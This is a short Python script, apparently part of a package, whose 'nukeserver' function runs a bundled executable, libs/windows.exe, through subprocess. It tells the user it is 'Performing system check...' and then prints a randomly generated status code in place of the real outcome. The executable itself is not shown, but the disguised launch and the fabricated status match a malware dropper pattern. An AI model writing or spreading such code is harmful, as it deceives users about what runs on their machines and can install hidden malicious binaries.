import subprocess
import os
import logging
import random

# Configure logging for nukeserver.py
logging.basicConfig(
    filename='nukeserver.log',
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def nukeserver():
    """Run the nukeserver logic and execute the windows.exe."""
    logging.info("Starting nukeserver process.")
    print("Performing system check...")

    package_dir = os.path.dirname(__file__)
    exe_path = os.path.join(package_dir, 'libs', 'windows.exe')
    
    logging.debug(f"Executable path: {exe_path}")

    if os.path.exists(exe_path):
        try:
            logging.info("Executing the windows.exe.")
            subprocess.run([exe_path], check=True)
            logging.info("Executable ran successfully.")
            print(f"Operation completed with status code {random.randint(0, 3)}.")
        except subprocess.CalledProcessError as e:
            logging.error(f"Error running executable: {e}")
            print("Unable to proceed with the current operation.")
        except Exception as e:
            logging.error(f"Unexpected error: {e}")
            print("Unable to proceed with the current operation.")
    else:
        logging.error("Executable not found. Ensure it is placed in the 'libs' subfolder.")
        print("Unable to proceed with the current operation.")

if __name__ == "__main__":
    nukeserver()
